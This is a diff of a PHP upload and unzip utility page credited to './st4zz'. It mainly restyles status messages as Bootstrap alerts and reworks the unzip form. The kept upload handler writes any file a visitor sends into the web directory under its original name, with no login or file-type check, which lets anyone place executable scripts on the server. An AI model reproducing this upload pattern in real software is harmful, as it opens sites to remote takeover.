@@ -103,8 +103,8 @@ echo '<div class="row justify-content-center">
 </div>
 </section>';
 if( $_POST['_upl'] == "Mulai Upload File" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert">File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/><br/>'; }
-else { echo '<div class="alert alert-danger text-center" role="alert">File gagal diupload...!!!</div><br/><br/>'; }
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert">File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/>'; }
+else { echo '<div class="alert alert-danger text-center" role="alert">File gagal diupload...!!!</div><br/>'; }
 }
 ?>
 <hr/>
@@ -139,10 +139,10 @@ class Unzipper {
       closedir($dh);
 
       if(!empty($this->zipfiles)) {
-        self::$status = '<b><span style="color:green;">File ZIP atau GZ berhasil ditemukan!</span></b>';
+        self::$status = '<div class="alert alert-primary text-center" role="alert"><b>File .ZIP atau .GZ berhasil ditemukan, silahkan pilih untuk di ekstrak.</b></div>';
       }
       else {
-        self::$status = '<b><span style="color:red;">Tidak dapat menemukan file ZIP atau GZ!</span></b>';
+        self::$status = '<div class="alert alert-danger text-center" role="alert"><b>Tidak dapat menemukan file .ZIP atau .GZ didalam folder ini.</b></div>';
       }
     }
 
@@ -173,16 +173,10 @@ class Unzipper {
 
   }
 
-  /**
-   * Decompress/extract a zip archive using ZipArchive.
-   *
-   * @param $archive
-   * @param $destination
-   */
   public static function extractZipArchive($archive, $destination) {
     // Check if webserver supports unzipping.
     if(!class_exists('ZipArchive')) {
-      self::$status = '<span style="color:red;">Your PHP version does not support unzip functionality.</span>';
+      self::$status = '<div class="alert alert-danger text-center" role="alert">Your PHP version does not support unzip functionality.</div>';
       return;
     }
 
@@ -194,27 +188,21 @@ class Unzipper {
       if(is_writeable($destination . '/')) {
         $zip->extractTo($destination);
         $zip->close();
-        self::$status = '<span style="color:green;"><b>File berhasil di ekstrak :)</b></span>';
+        self::$status = '<div class="alert alert-success text-center" role="alert"><b>File berhasil di ekstrak :)</b></div>';
       }
       else {
-        self::$status = '<span style="color:red;">Directory not writeable by webserver.</span>';
+        self::$status = '<div class="alert alert-danger text-center" role="alert">Directory not writeable by webserver.</div>';
       }
     }
     else {
-      self::$status = '<span style="color:red;">Tidak dapat membaca file ZIP atau GZ</span>';
+      self::$status = '<div class="alert alert-danger text-center" role="alert">Tidak dapat membaca file ZIP atau GZ.</div>';
     }
   }
 
-  /**
-   * Decompress a .gz File.
-   *
-   * @param $archive
-   * @param $destination
-   */
   public static function extractGzipFile($archive, $destination) {
     // Check if zlib is enabled
     if(!function_exists('gzopen')) {
-      self::$status = '<span style="color:red;">Your PHP has no zlib support enabled.</span>';
+      self::$status = '<div class="alert alert-danger text-center" role="alert">Your PHP has no zlib support enabled.</div>';
       return;
     }
 
@@ -230,36 +218,39 @@ class Unzipper {
 
     // Check if file was extracted.
     if(file_exists($destination . '/' . $filename)) {
-      self::$status = '<span style="color:green;"><b>File berhasil di ekstrak :)</b></span>';
+      self::$status = '<div class="alert alert-success text-center" role="alert"><b>File berhasil di ekstrak :)</b></div>';
     }
     else {
-      self::$status = '<span style="color:red;"><b>Error mengekstrak file</b></span>';
+      self::$status = '<div class="alert alert-danger text-center" role="alert"><b>Error mengekstrak file!</b></div>';
     }
-
   }
 }
-
 ?>
-<h1 align="center"><<- UnZip File ->></h1>
-<center><div class="status">
-  <b>Status:</b> <?php echo $arc::$status; ?>
+<section id="unzip" class="unzip mb-4">
+<div class="container">
+<div class="row mb-3 pt-2">
+<div class="col text-center">
+<h2>Unzip File Menu</h2>
 </div>
+</div>
+<div class="row justify-content-center">
+<div class="col-lg-8">
+<?php echo $arc::$status; ?>
 <form action="" method="POST">
-  <fieldset>
-
-    <select name="zipfile" size="1" class="select">
+  <p align="center"><fieldset>
+    <select name="zipfile" size="1" class="custom-select" id="zipfile">
       <?php foreach ($arc->zipfiles as $zip) {
-        echo "<option>$zip</option>";
+        echo "<option selected>Silahkan Pilih...</option>
+      <option>$zip</option>";
       }
       ?>
     </select>
-
-    <br/>
-
-    <input type="submit" name="submit" class="submit" value="UnZip File"/>
-
-  </fieldset>
-</form></center>
+  </fieldset></p>
+    <div align="center"><input type="submit" name="submit" class="btn btn-secondary" value="Mulai UnZip File"/></div>
+</form>
+</div>
+</div>
+</section>
 <hr/>
 <table width="100%"><tr><td style="text-align:left;"><a href="." title="Back to directory">« Back to Directory</a></td><td style="text-align:right;">Script coded by <a title="st4zz Blog" href="http://blog.st4zz.io" target="_blank">./st4zz</a></td></tr></table>
 </body>
